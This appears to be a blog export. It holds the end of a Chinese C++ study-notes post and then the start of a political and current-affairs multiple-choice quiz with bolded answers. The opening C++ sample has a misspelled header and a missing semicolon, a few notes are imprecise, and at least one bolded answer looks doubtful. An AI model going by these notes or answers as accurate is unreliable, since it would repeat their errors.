<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostreram&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a decimal number: &quot;</span></span><br><span class="line">	<span class="keyword">int</span> decimal;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; decimal;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">string</span> hex = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (decimal != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> hexValue = decimal % <span class="number">16</span>;<span class="comment">//先取模</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">char</span> hexChar = (hexValue &lt;= <span class="number">9</span> &amp;&amp; hexValue &gt;= <span class="number">0</span>) ? </span><br><span class="line">			<span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(hexValue + <span class="string">&#x27;0&#x27;</span>) : </span><br><span class="line">			<span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(hexValue - <span class="number">10</span> + <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		hex = hexChar + hex;<span class="comment">//加在前面</span></span><br><span class="line">		decimal = decimal / <span class="number">16</span>;<span class="comment">//后除</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The hex number is &quot;</span> &lt;&lt; hex &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="函数（function）"><a href="#函数（function）" class="headerlink" title="函数（function）"></a>函数（function）</h1><ol start="50">
<li><p>   主函数由操作系统调用，用于启动程序的执行。其他函数必须由函数调用语句来执行。</p>
</li>
<li><p>   每当一个函数被调用时，系统都会创建一个活动记录（也成为活动结构）来存储其参数和变量并将活动记录放置到一个叫做调用栈的内存区域。调用栈也被称为执行栈、运行栈或者机器栈，也经常简称为<strong>栈</strong>。</p>
</li>
<li><p>   <code>void</code>函数是不需要<code>return</code>语句的，但可以在<code>void</code>函数中使用<code>return</code>语句结束函数，返回调用者。这种用法并不常见，但有时可有效绕过一个<code>void</code>函数的正常控制流。</p>
</li>
<li><p>   有时候需要在不正常的情况下终止程序，这个功能可以通过调用<code>exit(int)</code>函数，在<code>cstdlib</code>头文件中。可以通过传递任何一个整数来调用这个函数的显示程序中的错误。</p>
</li>
<li><p>   默认为值传递，参数顺序关联。函数可以被用来减少冗余的代码，并使代码可以复用。函数可以用来模块化代码并提升程序的质量。</p>
</li>
<li><p>   函数的重载：用同样名字命名函数，签名不同，不同的参数列表。重载函数必须有不同的参数列表，你不能依据不同的返回值类型重载函数。数学函数都在<code>cmath</code>头文件中重载。</p>
</li>
<li><p>   在函数原形中只需列出参数类型，声明函数（不用实现）、定义函数（给出执行函数的函数体）。</p>
</li>
<li><p>   声明函数时可指定参数的缺省值，带缺省值的参数应该放在函数列表末尾，调用函数时，如果一个参数未给出，那么在它之后的参数也不能给出。</p>
</li>
<li><p>   <strong>内联函数（inline function）</strong>可提升短函数性能，不会被调用，避免函数调用的开销，实际上编译器将其代码复制到了每个调用点上。（在声明函数前加上关键字<code>inline</code>）C++编译器会扩展每个对内联函数的调用，将函数代码复制过来替换调用。C++允许编译器对过长的函数忽略<code>inline</code>关键字。</p>
</li>
<li><p>   函数内部定义的变量称为局部变量，定义在所有函数之外的变量是全局变量，可被其作用域内所有函数访问。局部变量没有缺省值，而全局变量的缺省值为0（default to 0）。</p>
</li>
<li><p>   作用域<br>局部变量：从<em>声明</em>到<em>包含它的程序块结束</em>，<br>全局变量：从<em>声明</em>到<em>程序末尾</em>。</p>
</li>
<li><p>声明在主函数之后的全局变量无法被主函数访问。</p>
</li>
<li><p>如果一个函数中定义了一个与全局变量同名的局部变量，那么在函数内部只有局部变量是可见的。应尽量避免使用全局变量。</p>
</li>
<li><p>   改变生存周期：静态局部变量，在程序的整个生命周期中会一直驻留在内存中。<code>static</code>关键字。当一个函数结束执行后，其所有局部变量都会被销毁（自动变量）。作用：保留局部变量的值，以便在下次调用时使用。</p>
</li>
<li><p>   参数可以通过引用方式调用，使形参是实参的一个别名。因此，函数中参数的改变也改变了参数的实际值。引用变量，在变量名前或数据类型后加一个<code>&amp;</code>。二者共享内存，共享相同的变量，形参和实参的类型要相同，否则值传递。</p>
</li>
<li><p>   引用传递的实参必须是一个变量，值传递时传入的参数可以是一个数值、一个变量或者是一个表达式，甚至是另一个函数的返回值。</p>
</li>
<li><p>   常量引用参数<code>const int&amp; num</code>。</p>
</li>
<li><p>   对于<code>string</code>类型的对象，引用传递比值传递更有效（节省内存），因为对象可能占据大量内存，然而对于<code>int</code>和<code>double</code>类型，区别是微不足道的。所以，如果原始的数据类型不需要在函数中改变，就可以简单地声明值传递。</p>
</li>
<li><p>   <strong>函数抽象（function abstraction）</strong>就是将函数的使用和实现分离。实现细节被封装在函数内，对调用函数的用户是隐藏的，这就是所谓的<strong>信息隐藏（information hiding）</strong>或<strong>封装（encapsulation）</strong>，函数实现的信息对用户来说是隐藏在“黑箱”内的。</p>
</li>
<li><p>   函数抽象的思想可以用于程序开发过程。当编写一个大程序时，可使用<strong>分治（divide and conquer）</strong>的策略，也称为<strong>逐步求精（stepwise refinement）</strong>，即将原问题分解为若干子问题，子问题还可进一步分解为更小的，更易处理的问题。</p>
</li>
<li><p>   使用函数抽象思想将设计和细节分离，最后再实现细节。实现上可以采用“<strong>自顶向下（top-down）</strong>”方法，就是按结构图，从上至下依次实现每个函数。对于还未实现的函数，可用<strong>桩（stub）函数</strong>代替。还可以用“<strong>自底向上（bottom-up）</strong>”方法，从下至上地实现结构图中的每个函数。每实现一个函数，编写一个测试函数，也称<strong>驱动（driver）</strong>，测试其正确性。</p>
</li>
<li><p>   逐步求精的好处：易编写、复用（减少代码冗余）、开发、调试、测试、修改、维护，更好地促进团队合作。</p>
</li>
</ol>
<h1 id="数组（array）"><a href="#数组（array）" class="headerlink" title="数组（array）"></a>数组（array）</h1><ol start="72">
<li><p>   <strong>数组（array）</strong>是一种数据结构，是用来存储<strong>同类型</strong>变量的数据集合。声明数组时<code>elementType arrayName[SIZE]</code>，编译器为数组分配了<code>SIZE</code>个<code>elementType</code>型元素的空间。当一个数组被声明后，其元素初值是任意的。数组大小必须是常量表达式。数组下标是0基址的，范围是0~`arraySize-1<code>。注意声明与访问不同，声明</code>int array[10]<code>，访问从</code>array[0]<code>到</code>array[9]`。</p>
</li>
<li><p>   数组初始化语句：<code>double myList[4] = &#123; 1, 2, 3, 4 &#125;;</code>其中<code>myList[4]</code>也可以写为<code>myList[]</code>。（不能分成两句写）</p>
</li>
<li><p>   C++允许只初始化数组的一部分元素（<code>cin &gt;&gt; myList[i];</code>），此时，其余元素被赋予0。注意，如果一个数组被创建，但还未初始化，那么其元素的值都是“垃圾”（不确定是什么内容，这一点与其他局部变量是类似的。</p>
</li>
<li><p>   只能用<code>for</code>循环输出数组，同样，只能用<code>for</code>循环复制数组。</p>
</li>
<li><p>   <code>string months[] = &#123; &quot;January&quot;, ..., &quot;December&quot; &#125;;</code>字符串数组。</p>
</li>
<li><p>   可将数组传递给函数，即数组的起始地址被传递给了函数中的数组参数（形参）（值传递）。语义上讲，这就属于传递共享，也就是函数中的数组和传递给函数的数组是同一个（改变同时发生）。</p>
</li>
</ol>
<blockquote>
<p>通常，向一个函数传递一个数组时，应该通过另一个参数将其大小也传递给函数，这样函数就能知道数组中包含多少个元素。否则，就需要将数组大小硬编码到函数中，或在全局变量中声明它。但哪种方法都不是一种灵活的、健壮的方法。</p>
</blockquote>
<ol start="78">
<li><p>   在函数中定义<code>const</code>数组参数，防止被修改。<code>const</code>数组被传递给另外一个函数后，对应参数也必须声明为<code>const</code>类型，确保一致性。数组不可作为函数值返回。</p>
</li>
<li><p>   二分搜索前提有序，无法找到返回<code>-low-1</code>。</p>
</li>
<li><p>   选择排序找到最小放在最前。</p>
</li>
<li><p>   二维数组<code>matrix[2][1]</code>指第三行第二列。</p>
</li>
<li><p>   二维数组声明：</p>
</li>
</ol>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml">int m[3][3] = </span><span class="template-variable">&#123; &#123; 1, 2, 3 &#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">				</span><span class="template-variable">&#123; 4, 5, 6 &#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">				</span><span class="template-variable">&#123; 7, 8, 9 &#125;</span><span class="xml"> &#125;;</span></span><br></pre></td></tr></table></figure>
<ol start="83">
<li>   二维数组可作为函数参数，要指明列的大小。</li>
</ol>
<h1 id="面向对象编程（Object-Oriented-Programming，OOP）"><a href="#面向对象编程（Object-Oriented-Programming，OOP）" class="headerlink" title="面向对象编程（Object-Oriented Programming，OOP）"></a>面向对象编程（Object-Oriented Programming，OOP）</h1><ol start="84">
<li><p>   一个对象具有唯一的身份、状态和行为。状态/属性（state）用<strong>数据域（datafield）</strong>及它们的当前值表示，行为/动作（behavior）由一组<strong>函数</strong>定义。对一个对象调用一个函数就是请求对象执行一个操作。</p>
</li>
<li><p>   相同类型的对象用一个通用的类来定义。一个<strong>类（class）</strong>是指一个模板、蓝图或约定（contract），定义了对象具有什么样的数据域和函数。</p>
</li>
<li><p>   C++类中，用变量定义数据域，用函数定义行为。类就是用于创建对象的模板。</p>
</li>
<li><p>   构造函数，可以执行任何动作，目的用来执行<strong>初始化动作</strong>和<strong>初始化对象的数据域</strong>。</p>
</li>
<li><p>   类和对象可以用UML表示法来描述，UML是统一建模语言。UML类图中，+表示公有域，-表示私有域。</p>
</li>
<li><p>   定义类末尾有分号，<code>public</code>表示所有的数据域，构造函数和普通成员函数都可以通过类对象来访问。缺省（<code>default</code>）为私有的（<code>private</code>）。</p>
</li>
<li><p>   <code>Circle circle1(1.0)</code>创建对象，<code>Circle.radius = 1</code>重新赋值，<code>circle.radius</code>访问数据域，<code>circle.getArea()</code>调用函数。</p>
</li>
<li><p>   构造函数是一种特殊的函数，与其他函数相比有下面3个不同点：</p>
</li>
</ol>
<ul>
<li>构造函数的名字必须与类名相同。</li>
<li>构造函数没有返回类型——即便返回<code>void</code>也不可以。</li>
<li>在创建对象时，构造函数被调用，它的作用就是初始化对象。</li>
</ul>
<ol start="92">
<li><p>构造函数可以被重载，即可以有多个同名的构造函数，但签名不同，目的是用不同初始数据创建对象。</p>
</li>
<li><p>只能用构造函数来初始化数据域。作为一个类成员，数据域不能在声明时进行初始化。（无参构造函数<code>Circle()</code>）</p>
</li>
<li><p>一个类的声明中可以不包含构造函数的声明，这种情况下，相当于在类中隐含声明了一个无参的空构造函数（缺省构造函数）。只有当程序员没有在类中显式地声明构造函数时，编译器才会自动提供缺省构造函数。</p>
</li>
<li><p><code>Circle::Circle():radius(1)&#123;&#125;</code>与<code>Circle::Circle()&#123; radius = 1; &#125;</code>等价。</p>
</li>
<li><p>对象的数据域没有无参构造函数时，有必要采用初始化列表的方法来初始化。</p>
</li>
<li><p>调用函数即执行操作。<code>objectName.datafield</code>引用对象中的一个数据域，<code>objectName.function(arguments)</code>调用对象上的一个函数。</p>
</li>
<li><p>某个数据域被称为实例成员变量或实例变量，某个成员函数被称为实例成员函数或实例函数，因为它们依赖于特定的实例。</p>
</li>
<li><p>类首字母大写，C++库中类小写。对象的命名参照变量。</p>
</li>
<li><p>一个类就是一个数据类型，<code>=</code>实现对象间内容的复制。<code>sizeof</code>查看大小（<strong>字节数</strong>）。</p>
</li>
<li><p><code>ClassName()</code>使用无参构造函数创建一个匿名对象，<code>ClassName(arguments)</code>使用带参数的构造函数创建一个匿名对象。</p>
</li>
<li><p>类定义和实现分离，<code>.h</code>文件（头文件末尾有分号）和<code>.cpp</code>文件。类定义：列出数据域、构造函数原型和函数原型；类实现：构造函数和成员函数的实现。</p>
</li>
<li><p><code>.cpp</code>文件要<code>#include &quot;Circle.h&quot;</code>，<code>Circle::...</code>二元作用域解析运算符，指明了类成员的作用范围。</p>
</li>
<li><p>在集成开发环境中开发程序，如果主程序还使用其他程序，那么所有源程序文件都应包含在项目中。否则，就会导致连接错误。</p>
</li>
<li><p><strong>包含保护（inclusion guard）</strong>：避免头文件被多次包含（以<code>Circle.h</code>为例）</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CIRCLE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CIRCLE_H</span></span><br></pre></td></tr></table></figure>
<ol start="106">
<li><p>函数在类定义内实现，自动成为一个内联函数。</p>
</li>
<li><p>数据域私有<code>private</code>可以保护数据，并且使类易于维护。</p>
</li>
<li><p>数据域封装，在类之外的程序中，无法通过直接引用类对象来访问它。<code>set</code>函数间接操作，<code>get</code>函数返回其值。数据域声明顺序任意，最好先公后私。</p>
</li>
<li><p><code>get</code>函数就是一个“<strong>访问器</strong>”<strong>（accessor）</strong>，而<code>set</code>函数就是一个“<strong>更改器</strong>”<strong>（mutator）</strong>。一个<code>get</code>函数具有如下的函数签名：</p>
</li>
</ol>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">returnType</span> <span class="function"><span class="title">getPropertyName</span>()</span></span><br></pre></td></tr></table></figure>
<p>假如返回类型是<code>bool</code>类型，则<code>get</code>函数习惯上定义为如下形式：</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">bool</span> <span class="function"><span class="title">isPropertyName</span>()</span></span><br></pre></td></tr></table></figure>
<ol start="110">
<li>一个<code>set</code>函数的函数签名如下：</li>
</ol>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">void set<span class="constructor">PropertyName(<span class="params">dataType</span> <span class="params">propertyValue</span>)</span></span><br></pre></td></tr></table></figure>
<ol start="111">
<li><p>在类中，只能为一个数据域声明一个成员变量，但一个变量名可用在多个不同的函数中声明多个局部变量。</p>
</li>
<li><p>类抽象（实现与使用分离）、封装（实现的细节封装起来，对用户隐藏）。</p>
</li>
<li><p>C字符串是以<code>&#39;\0&#39;</code>结尾的字符数组，<code>string</code>类：<code>string s = &quot;Welcome to C++&quot;;</code>（这样更好<code>string s(&quot;Welcome to C++&quot;);</code>）。也可以使用<code>string</code>类的构造函数从C字符串来创建一个字符串，如下所示：</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> s1[] = <span class="string">&quot;Good morning&quot;</span>;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s</span><span class="params">(s1)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这里，s1是一个C字符串，而s是一个字符串对象。</p>
<ol start="114">
<li>把数字转换为字符串，使用<code>sstream</code>头文件中的<code>stringstream</code>类：</li>
</ol>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">stringstream <span class="built_in">ss</span><span class="comment">;</span></span><br><span class="line"><span class="built_in">ss</span> &lt;&lt; <span class="number">3.1415</span><span class="comment">;</span></span><br><span class="line">string s = <span class="built_in">ss</span><span class="number">.</span><span class="keyword">str</span>()<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<ol start="115">
<li><p>如果希望一个类的所有实例共享数据，应该使用<strong>静态变量（static variable）</strong>，也称为<strong>类变量（class variable）</strong>。静态变量机制在一个共同的内存位置中保存多个对象的变量的值。由于使用共同的内存位置，因此如果一个对象改变了静态变量的值，那么实际上同一个类的所有对象的此变量的值都被改变了。声明前<code>static</code>。</p>
</li>
<li><p>只读成员函数，在函数头的结尾加上<code>const</code>，函数不会改变对象的数据域。和常量参数一样，只读函数也是一种<strong>防御式编程（defensive programming）</strong>。若函数不改变传递给它的对象内容，应该给该参数加上<code>const</code>关键字。</p>
</li>
</ol>
<blockquote>
<p>只有实例函数可被定义为只读函数，静态函数是不能被定义为只读函数的。</p>
</blockquote>
<ol start="117">
<li><p>面向过程范式要点是设计函数，而面向对象范式把数据和函数结合在一起形成对象（对象、对象的操作）。</p>
</li>
<li><p>类设计准则：内聚（cohesion）、一致（consistency）、封装（encapsulation）、清晰（clarity）、完整（completeness）、实例与静态（instance&amp;static）。</p>
</li>
</ol>
<h1 id="指针（pointer）"><a href="#指针（pointer）" class="headerlink" title="指针（pointer）"></a>指针（pointer）</h1><ol start="119">
<li><p>指针变量也称指针，它是C++的一个强有力的特性，是C++语言的核心和灵魂，可以用来引用数组、对象或任何变量的地址。</p>
</li>
<li><p>指针变量保存的是内存地址，利用解引用运算符<code>*</code>可以访问指针指向的特定内存位置中的数据。<code>&amp;</code>为地址运算符，取变量的地址。</p>
</li>
<li><p>声明指针<code>dataType* pVarName</code>,向指针赋予地址<code>pVarName = &amp;varName</code>。（推荐在单独的语句行中声明一个指针）</p>
</li>
<li><p>对指针赋值，必须使用相同类型变量的地址。可以把指针变量赋值为同类型的指针，但是不能把一个指针变量赋予一个非指针变量。</p>
</li>
<li><p>应该总是保证对指针进行初始化，以避免错误。可以将一个指针赋值为0，表示指针未指向任何变量。<code>iostream</code>等C++库中定义常量<code>NULL</code>为0，使用它来替代0能让程序可读性更高。</p>
</li>
<li><p>C++允许使用关键字<code>typedef</code>来自定义同义类型<code>typedef existingType newType</code>。</p>
</li>
<li><p>指针为常量即指针指向一个不变的内存位置，但该内存位置处的实际值是可以改变的。</p>
</li>
</ol>
<blockquote>
<p>常量指针与指针常量的区别：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="built_in">int</span>* p = &amp;<span class="built_in">var</span>;<span class="comment">//常量指针</span></span><br><span class="line"><span class="built_in">int</span>* <span class="keyword">const</span> p = &amp;<span class="built_in">var</span>;<span class="comment">//指针常量</span></span><br></pre></td></tr></table></figure>
<ol start="126">
<li>在C++中，数组名实际上是指向数组中第一个元素的指针（指向的位置不能改变）。数组与指针的联系是很紧密的，一个数组实质上是一个指针。而指向一个数组的指针可以像数组一样使用，甚至可以对指针使用下标变量。即<code>array[0]</code>与<code>*array</code>等价，<code>array[1]</code>与<code>*(array + 1)</code>、<code>p[1]</code>、<code>*(p + 1)</code>等价。(<code>int* p = array</code>)</li>
</ol>
</blockquote>
<ol start="127">
<li><p>C++允许对指针加、减一个整数，效果是指针包含的地址值被增加或减少，变化的量是该整数乘以指针指向的元素的大小。可以用关系运算符对指针进行比较运算，以确定指针的先后次序。</p>
</li>
<li><p>由于C字符串可通过指针来访问，所以C字符串也被称为<strong>基于指针的字符串（pointer-based string）</strong>。</p>
</li>
<li><p>在C++中，函数的参数可以是指针，即可以在函数调用时传递指针参数（值传递）。例：</p>
</li>
</ol>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">void</span> f(<span class="built_in">int</span>* p1, <span class="built_in">int</span>* &amp;p2)</span><br></pre></td></tr></table></figure>
<p>这和下面的语句是等价的：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="built_in">int</span>* <span class="built_in">int</span>Pointer;</span><br><span class="line"><span class="built_in">void</span> f(<span class="built_in">int</span>Pointer p1, <span class="built_in">int</span>Pointer&amp; p2)</span><br></pre></td></tr></table></figure>
<ol start="130">
<li>如果使用指针<code>q1</code>和<code>q2</code>调用函数<code>f(q1, q2)</code>：</li>
</ol>
<ul>
<li><code>q1</code>是通过传值方式传给<code>p1</code>的，所以<code>*p1</code>和<code>*q1</code>指向相同的内容。如果函数<code>f</code>修改了<code>*p1</code>（例如，<code>*p1 = 20</code>），则<code>*q1</code>也相应修改了。但如果函数<code>f</code>修改了<code>p1</code>（例如，<code>p1 = somePointerVariable</code>），则<code>q1</code>并未改变。</li>
<li><code>q2</code>是通过传引用方式传给<code>p2</code>的，所以<code>q2</code>是<code>p2</code>的别名，它们是等同的。无论函数<code>f</code>修改了<code>*p2</code>还是<code>p2</code>，对应的<code>*q2</code>和<code>q2</code>也相应修改了。</li>
</ul>
<ol start="131">
<li><p>函数中的数组参数都可以用指针参数来替换，即将<code>list[]</code>替换为<code>*list</code>。有的参数的值（在函数执行过程中）不改变，为避免无意中修改它，应该把它声明为<code>const</code>类型。</p>
</li>
<li><p>在C++中，函数可以返回一个指针。</p>
</li>
<li><p>C++提供了操作数组的一些有用函数，在头文件<code>algorithm</code>中。函数<code>min_element</code>和<code>max_element</code>返回指向数组中最小和最大元素的指针，<code>sort</code>函数可以对数组进行排序，<code>random_shuffle</code>函数可以对数组进行随机洗牌，<code>find</code>函数可以在数组中查找某个元素。所有这些函数的参数和返回值都是指针（地址值）。</p>
</li>
</ol>
<h1 id="动态内存管理"><a href="#动态内存管理" class="headerlink" title="动态内存管理"></a>动态内存管理</h1><ol start="134">
<li><p><code>new</code>操作符可以在运行时为基本数据类型、数组和对象分配持久的内存空间。</p>
</li>
<li><p>局部变量是非持久的，当函数返回时，调用栈中的局部变量会被丢弃掉。试图访问指向这样地址的指针，会导致不正确的、不可预知的结果。为修正这个错误，需要为该变量分配持久的内存空间，以便能在函数返回后正常访问它。</p>
</li>
</ol>
<h1 id="To-be-continued…"><a href="#To-be-continued…" class="headerlink" title="To be continued…"></a>To be continued…</h1>]]></content>
      <tags>
        <tag>Notes</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>理论学习（二）</title>
    <url>/Theory-Study-2/</url>
    <content><![CDATA[<p>本文整理了理论学习的有关资料，如有错误恳请指正。</p>
<a id="more"></a>

<h1 id="单选"><a href="#单选" class="headerlink" title="单选"></a>单选</h1><p>新中国成立70年来，城乡居民收入保持了快速增长，消费水平明显提高。家庭的食品支出金额占消费支持总金额的比重在不断下降，从1978年到2018年，全国居民恩格尔系数下降了大约（  ）个百分点。<br><strong>35.5</strong><br>36.5<br>37.5<br>38.5</p>
<p>党的十九大报告指出，农业农村农民问题是关系国计民生的根本性问题，必须始终把解决好“三农”问题作为全党工作的重中之重，实施（   ）战略<br>科教兴国<br><strong>乡村振兴</strong><br>人才强国<br>改革开放</p>
<p>我校和天津市人民医院共同研制的人工神经康复机器人（  ）是全球第一台适用于全肢体中风康复的“纯意念控制”人工神经机器人系统。<br>神匠一号<br>神舟一号<br>神医一号<br><strong>神工一号</strong></p>
<p>国庆节前夕，中国第一艘自主运营的豪华邮轮“鼓浪屿”号扬帆远航，完成了从(   )的首航之旅。“鼓浪屿”号邮轮是中国旅游集团和中国远洋海运集团共同投资运营的中国民族邮轮品牌“星旅远洋”旗下的首艘豪华邮轮。“鼓浪屿”号约为7万吨，邮轮长度260米，宽度32.2米，共有13层甲板，941间客房，可载客1880人。<br>厦门到天津<br>厦门到深圳<br>重庆到香港<br><strong>厦门到香港</strong></p>
<p>2019年9月25日，278名个人和22个集体当选“最美奋斗者”。3个多月来，中央宣传部等部门在全国城乡广泛开展(  )活动，热情讴歌新中国成立以来各地区、各部门、各行业涌现出来的先进人物，生动讲述他们与祖国共成长、共奋斗的感人故事。<br>“最美奋斗者”奋进新时代<br>“最美奋斗者”全国宣讲<br><strong>“最美奋斗者”学习宣传</strong><br>“奋进新时代”学习宣传</p>
<p>全国民族团结进步表彰大会9月27日上午在北京举行。中共中央总书记、国家主席、中央军委主席习近平出席大会并发表重要讲话。他强调，要以（）为主线，全面贯彻党的民族理论和民族政策，坚持共同团结奋斗、共同繁荣发展，把（）作为基础性事业抓紧抓好，促进各民族像石榴籽一样紧紧拥抱在一起，推动中华民族走向包容性更强、凝聚力更大的命运共同体，共建美好家园，共创美好未来。<br>社会主义现代化发展、全国民族团结进步<br><strong>铸牢中华民族共同体意识、民族团结进步事业</strong><br>经济建设、全面推进各民族团结进步<br>全面推进各民族团结进步、新时代中国特色社会主义发展</p>
<p>在新中国成立70周年之际，被誉为“新世界七大奇迹”之首的（ ）投入运营。该工程从开工到建成耗时不到5年，以“中国速度”创造了多项纪录，成为中国基础设施建设工程中一座新的里程碑。<br>港珠澳大桥<br>天津高银117大厦<br><strong>北京大兴国际机场</strong><br>上海证大喜马拉雅中心</p>
<p>为隆重庆祝中华人民共和国成立70周年，全景式展现新中国风雨兼程、砥砺前行的伟大历程，中央电视台综合频道播出大型文献专题片（  ）。<br>《砥砺奋进70年》<br>《使命》<br><strong>《我们走在大路上》</strong><br>《希望的田野上》</p>
<p>2019年7月5日，在联合国教科文组织世界遗产委员会举行的第43届世界遗产大会上，审议通过将( )列入《世界遗产名录》。该项目成为中国第54处世界遗产。<br>鼓浪屿：历史国际社区<br><strong>良渚古城遗址</strong><br>中国黄(渤)海候鸟栖息地(第一期)<br>梵净山</p>
<p>中共中央政治局2019年9月24日下午就“（）”举行第十七次集体学习。<br>伟大历程　辉煌成就——庆祝中华人民共和国成立70周年<br>为实现中华民族伟大复兴的中国梦不懈奋斗<br>大力弘扬爱国主义精神<br><strong>新中国国家制度和法律制度的形成和发展</strong></p>
<p>一年一度的七国集团峰会2019年9月24日开幕，本届峰会的主题是（）<br> “聚焦全球经济治理与合作”<br><strong>“反对不平等”</strong><br> “反对贸易保护”<br>“聚焦可持续发展”</p>
<p>新中国成立70年来，我国坚持独立自主的和平外交政策，积极与世界各国发展友好合作，特别是改革开放以来，抓住全球化机遇，从大规模（）到大踏步（），再到共建“一带一路”，对外开放广度深度显著拓展。<br><strong>“引进来”；“走出去”</strong><br>“引进来”；“带出去”<br>“送进来”；“走出去”<br>“送进来”；“带出去”</p>
<p>2018年，国外三大检索工具《科学引文索引（SCI）》《工程索引（EI）》和《科技会议录索引（CPCI）》分别收录我国科研论文41.8万篇、26.6万篇和5.9万篇，数量分别位居世界第二、第一和第二位。论文质量大幅提升，根据基本科学指标数据库（ESI）论文被引用情况，2018年我国科学论文被引用次数排名世界第（）位。<br>一<br><strong>二</strong><br>三<br>四</p>
<p>“四个全面”中，实现党和国家长治久安的重要保障是（）。<br>全面建成小康社会<br>全面深化改革<br><strong>全面依法治国</strong><br>全面从严治党</p>
<p>中共（）正式决定对国民经济实行“调整、巩固、充实、提高”的八字方针。<br><strong>八届九中全会</strong><br>十一届三中全会<br>八大<br>九大</p>
<p>必须认识到，我国社会主要矛盾的变化，没有改变我们对我国社会主义所处历史阶段的判断，我国仍处于并将长期处于（）的基本国情没有变，我国是世界最大发展中国家的国际地位没有变。<br>社会主义阶段<br><strong>社会主义初级阶段</strong><br>社会主义中级阶段<br>社会主义高级阶段</p>
<p>中国共产党第十九次全国代表大会，是在全面建成小康社会决胜阶段、中国特色社会主义进入（）的关键时期召开的一次十分重要的大会。<br>新时期<br>新阶段<br>新征程<br><strong>新时代</strong></p>
<p>中国共产党人的初心和使命，就是为中国人民（），为中华民族（）。这个初心和使命是激励中国共产党人不断前进的根本动力。<br>谋幸福，谋未来<br>谋生活，谋复兴<br><strong>谋幸福，谋复兴</strong><br>谋生活，谋未来</p>
<p>十九届三中全会强调，深化党和国家机构改革的指导思想是，全面 贯彻党的十九大精神，坚持以马克思列宁主义、毛泽东思想、邓小平理论、“三 个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想为指导， 适应新时代中国特色社会主义发展要求，坚持（），坚持（），坚持（），坚持（）。<br><strong>坚持稳中求进工作总基调，坚持正确改革方向，坚持以人民为中心，坚持全面依法治国。</strong><br>坚持党的全面领导、坚持以人民为中心、坚持优化协同高效、坚持全面依法治国<br>坚持全面深化改革，坚持全面依法治国，坚持全面从严治党，坚持以人民为中心<br>坚持稳中求进工作总基调，坚持全面深化改革，坚持以人民为中心，坚持全面依法治国</p>
<p>《中华人民共和国教育法》中教育的基本内容强调教育应当坚持什么（）？<br>教育第一<br>品德教育<br><strong>立德树人</strong><br>以人为本</p>
<p>10月13日，第五届中国“互联网＋”大学生创新创业大赛总决赛在浙江大学拉开战幕。天津大学共斩获（）金（）银（）铜。<br><strong>2；3；5</strong><br>3；3；5<br>2；2；5<br>2；3；6</p>
<p>2019年（）月（）日，天津大学“不忘初心、牢记使命”主题教育动员大会暨工作部署会在北洋园校区求实会堂举行。天津大学党委书记、主题教育领导小组组长李家俊作动员讲话，对全校开展主题教育工作进行部署。<br>9；9<br>9；10<br>9；11<br><strong>9；12</strong></p>
<p>近日，教育部发布《教育部关于2019年度教育部工程研究中心建设项目立项的通知》（教技函〔2019〕72号），我校“智能医学工程教育部工程研究中心”（简称：智能医学工程中心）正式获批组建。智能医学工程中心依托天津大学医学部，充分整合六家天津大学附属医院以及中国电子信息产业集团等长期合作企业优势资源，面向（）国家战略需求，以现代医学和生物学理论为基础，以智能人机交互为主线，围绕脑认知、大数据、云计算、机器学习等人工智能相关领域和临床应用的迫切需求，开展关键、共性技术攻关和新智能产品研发。<br>“健康中国2020”<br><strong>“健康中国2030”</strong><br>“健康中国2040”<br>“健康中国2050”</p>
<p>（）月（）日，天津大学与湖南省人民政府在长沙签署战略合作协议，双方聚焦湖南省科技创新发展和开放崛起战略，整合资源，在科技成果转化、教育人才培养、重大关键技术攻关等方面开展全方位合作。<br>10；23<br><strong>10；24</strong><br>10；25<br>10；26</p>
<p>2018年，中国对世界经济增长的贡献率为（）。<br>0.265<br><strong>0.275</strong><br>0.285<br>0.295</p>
